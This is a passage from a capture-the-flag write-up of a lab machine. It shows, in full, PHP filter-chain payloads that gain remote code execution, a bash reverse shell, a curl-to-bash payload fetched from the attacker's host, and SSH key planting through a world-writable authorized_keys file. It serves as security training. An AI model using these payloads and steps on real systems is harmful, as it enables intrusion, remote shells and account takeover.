t.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

We copy the entire giant payload string generated by the script. We send it as our `file` value and tack our system command (`id`, `whoami` etc.) onto the very end using `&cmd=`. The final URL structure should look like this

`http://10.113.133.100/secret-script.php?file=[MASSIVE_CHAIN]/resource=&cmd=whoami`

<img width="949" height="103" alt="grafik" src="https://github.com/user-attachments/assets/a38b09bf-0388-41e5-8729-1139e1f7c1cf" />

And that seems to have worked out fine. Now we can insert all the necessary commands, like ls, which gives us the following output:

```
adminpanel.css images index.html login.css login.php messages.html orders.html secret-script.php style.css supersecretadminpanel.html supersecretmessageforadmin users.html $)C�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@
```

Now the thing that frustrates me is that the next command I used was `ls /home/comte`

<img width="949" height="103" alt="grafik" src="https://github.com/user-attachments/assets/8743991d-3ec6-4461-9d09-9338816840ad" />

We can clearly see a user.txt file. I can't cat it though. Probably because my RCE web shell is currently executing commands as the `www-data` user (the low-privilege service account that runs the Apache/PHP web server). It's probably just `comte` who is allowed to read it. File permissions are set to `600` most probably.

To see my possible options I checked for SUID binaries. Maybe there could be files on the system that run with owner privileges. If there is a misconfigured SUID binary owned by `root` or `comte`, we can abuse it to read files or open a shell.

- `&cmd=find / -perm -4000 -type f 2>/dev/null`

The output I got was: 

```
/snap/snapd/21184/usr/lib/snapd/snap-confine /snap/snapd/20092/usr/lib/snapd/snap-confine /snap/core20/2501/usr/bin/chfn /snap/core20/2501/usr/bin/chsh /snap/core20/2501/usr/bin/gpasswd /snap/core20/2501/usr/bin/mount /snap/core20/2501/usr/bin/newgrp /snap/core20/2501/usr/bin/passwd /snap/core20/2501/usr/bin/su /snap/core20/2501/usr/bin/sudo /snap/core20/2501/usr/bin/umount /snap/core20/2501/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core20/2501/usr/lib/openssh/ssh-keysign /snap/core20/2182/usr/bin/chfn /snap/core20/2182/usr/bin/chsh /snap/core20/2182/usr/bin/gpasswd /snap/core20/2182/usr/bin/mount /snap/core20/2182/usr/bin/newgrp /snap/core20/2182/usr/bin/passwd /snap/core20/2182/usr/bin/su /snap/core20/2182/usr/bin/sudo /snap/core20/2182/usr/bin/umount /snap/core20/2182/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core20/2182/usr/lib/openssh/ssh-keysign /usr/bin/su /usr/bin/newgrp /usr/bin/chsh /usr/bin/fusermount /usr/bin/umount /usr/bin/sudo /usr/bin/passwd /usr/bin/mount /usr/bin/pkexec /usr/bin/gpasswd /usr/bin/at /usr/bin/chfn /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/snapd/snap-confine /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 
```

Nothing interesting. Next I checked interesting configuration files.

- `&cmd=ls -la /var/www/html`

Sadly none of them give me any reading permissions.

I've had enough. It's time to upgrade to a stable reverse shell. I used the following site as reference to figure out how to do this right: https://exploitnotes.org/exploit/web/php-filters-chain#exploitation.

<img width="1053" height="793" alt="grafik" src="https://github.com/user-attachments/assets/de656911-a843-4cf5-8a15-495b7692d927" />

We set up our listener `nc -lvnp 4444` and send a reverse shell command through the URL. For that I created a script like the page says. We use `nano revshell` and paste the following command in our file.

```
bash -i >& /dev/tcp/10.113.117.246/4444 0>&1
```

Then we create a chain using the generator.

```
root@ip-10-113-117-246:~/Downloads# python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.113.117.246/revshell|bash` ?>'
[+] The following gadget chain will generate the following code : <?= `curl -s -L 10.113.117.246/revshell|bash` ?> (base64 value: PD89IGBjdXJsIC1zIC1MIDEwLjExMy4xMTcuMjQ2L3JldnNoZWxsfGJhc2hgID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Also we should probably host a web server.

```
root@ip-10-113-117-246:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.113.133.100 - - [02/Jul/2026 17:32:51] code 404, message File not found
10.113.133.100 - - [02/Jul/2026 17:32:51] "GET /revshell/bash HTTP/1.1" 404 -
10.113.133.100 - - [02/Jul/2026 17:38:32] code 404, message File not found
10.113.133.100 - - [02/Jul/2026 17:38:32] "GET /revshell/bash HTTP/1.1" 404 -
10.113.133.100 - - [02/Jul/2026 17:42:24] code 404, message File not found
10.113.133.100 - - [02/Jul/2026 17:42:24] "GET /revshell HTTP/1.1" 404 -
10.113.133.100 - - [02/Jul/2026 17:42:58] "GET /revshell HTTP/1.1" 200 -
```

Now we should be able to get our reverse shell running when inserting that long php filter command in our URL.

```
root@ip-10-113-117-246:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.113.133.100 45496
bash: cannot set terminal process group (952): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-113-133-100:/var/www/html$ whoami
whoami
www-data
www-data@ip-10-113-133-100:/var/www/html$ ls -la /home/comte
ls -la /home/comte
total 52
drwxr-xr-x 7 comte comte 4096 Apr  4  2024 .
drwxr-xr-x 4 root  root  4096 Jul  2 14:35 ..
-rw------- 1 comte comte   55 Apr  4  2024 .Xauthority
lrwxrwxrwx 1 comte comte    9 Apr  4  2024 .bash_history -> /dev/null
-rw-r--r-- 1 comte comte  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 comte comte 3771 Feb 25  2020 .bashrc
drwx------ 2 comte comte 4096 Sep 27  2023 .cache
drwx------ 3 comte comte 4096 Mar 25  2024 .gnupg
drwxrwxr-x 3 comte comte 4096 Mar 25  2024 .local
-rw-r--r-- 1 comte comte  807 Feb 25  2020 .profile
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .ssh
-rw-r--r-- 1 comte comte    0 Sep 27  2023 .sudo_as_admin_successful
drwx------ 3 comte comte 4096 Mar 25  2024 snap
-rw------- 1 comte comte 4276 Sep 15  2023 user.txt
```

We can see a major misconfiguration visible in that directory listing that is a classic Privilege Escalation vector. Here it refers to the permissions on the .ssh directory.

When looking closely at this line from the output

```
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .ssh
```

The `r-x` at the very end means that any user on the system including us has read and execute permissions for this folder. In a secure Linux environment, this directory should strictly be set to `drwx------` (accessible only by `comte`).

Since the developer left this folder world-readable, we can peek inside to bypass the permission wall on `user.txt`.

```
www-data@ip-10-113-133-100:/var/www/html$ ls -la /home/comte/.ssh
ls -la /home/comte/.ssh
total 8
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .
drwxr-xr-x 7 comte comte 4096 Apr  4  2024 ..
-rw-rw-rw- 1 comte comte    0 Mar 25  2024 authorized_keys
```

The `rw-rw-rw-` permission means that any user on the system has full write access to this file.

Since we can write to `authorized_keys`, we can generate a brand-new SSH key pair, paste our public key into this file, and log in directly as the `comte` user over SSH - completely bypassing any password requirements. Here the step-by-step strategy:

### Step 1: Generate an SSH Key Pair on the AttackBox
Open a new terminal tab on our AttackBox and run the following command to create a temporary key pair.

```
root@ip-10-113-117-246:~# ssh-keygen -f /tmp/comte_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/comte_key
Your public key has been saved in /tmp/comte_key.pub
The key fingerprint is:
SHA256:WEBeKtNHEA2+P6YhWRufW3KbEkEB4dAT0LljSnWhB2k root@ip-10-113-117-246
The key's randomart image is:
+--[ED25519 256]--+
|    o=@@=o       |
|     *EB+        |
|    ooB=+        |
|    .o+*.        |
|   . o=.S.       |
|    .o =..       |
|    o o B.o      |
|     . +.* o     |
|      . ..o      |
+----[SHA256]-----+
```

This creates two files in my `/tmp` directory: `comte_key` which is our private key, and `comte_key.pub which is our public key.

### Step 2: Get our Public Key String
Display the contents of our newly generated public key:

```
cat /tmp/comte_key.pub
```

It will look something like this: `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ... root@attackbox`

```
root@ip-10-113-117-246:~# cat /tmp/comte_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJMKVKPrNAA3hsTQkyD20+ralCtP4Ci2gKM49/x2MU+t root@ip-10-113-117-246
```

### Step 3: Write the Public Key into our Target Machine
We go back to our Reverse Shell tab (where we are logged in as `www-data`). Run the following command, replacing `PASTE_YOUR_PUBLIC_KEY_HERE` with the exact string we copied in Step 2.

```
echo "PASTE_YOUR_PUBLIC_KEY_HERE" > /home/comte/.ssh/authorized_keys
```

```
www-data@ip-10-113-133-100:/var/www/html$ echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJMKVKPrNAA3hsTQkyD20+ralCtP4Ci2gKM49/x2MU+t root@ip-10-113-117-246 > /home/comte/.ssh/authorized_keys
<p-10-113-117-246 > /home/comte/.ssh/authorized_keys
```

### Step 4: Log in via SSH
Now, we go back to our AttackBox terminal. We can use our private key (`comte_key`) to log in directly as `comte`:

```
ssh -i /tmp/comte_key comte@10.113.117.246
```

Once the connection establishes, we will have a fully stable, high-privilege SSH terminal as `comte`. 

```
root@ip-10-113-117-246:~# ssh -i /tmp/comte_key comte@10.113.133.100
The authenticity of host '10.113.133.100 (10.113.133.100)' can't be established.
ED25519 key fingerprint is SHA256:3skZ9GTrTOzL1Q7v92FCBtwVcV5xtGxEHM/T1mCNIYQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.113.133.100' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu 02 Jul 2026 06:18:11 PM UTC

  System load:  0.0                Processes:             123
  Usage of /:   32.8% of 18.53GB   Users logged in:       0
  Memory usage: 34%                IPv4 address for ens5: 10.113.133.100
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

8 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Thu Apr  4 17:26:03 2024 from 192.168.0.112
comte@ip-10-113-133-100:~$ 
```

We did it! Time to read the user.txt file.

```
comte@ip-10-113-133-100:/home$ cd comte
comte@ip-10-113-133-100:~$ ls -la
total 52
drwxr-xr-x 7 comte comte 4096 Apr  4  2024 .
drwxr-xr-x 4 root  root  4096 Jul  2 14:35 ..
lrwxrwxrwx 1 comte comte    9 Apr  4  2024 .bash_history -> /dev/null
-rw-r--r-- 1 comte comte  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 comte comte 3771 Feb 25  2020 .bashrc
drwx------ 2 comte comte 4096 Sep 27  2023 .cache
drwx------ 3 comte comte 4096 Mar 25  2024 .gnupg
drwxrwxr-x 3 comte comte 4096 Mar 25  2024 .local
-rw-r--r-- 1 comte comte  807 Feb 25  2020 .profile
drwx------ 3 comte comte 4096 Mar 25  2024 snap
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .ssh
-rw-r--r-- 1 comte comte    0 Sep 27  2023 .sudo_as_admin_successful
-rw------- 1 comte comte 4276 Sep 15  2023 user.txt
-rw------- 1 comte comte   55 Apr  4  2024 .Xauthority
comte@ip-10-113-133-100:~$ cat user.txt
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
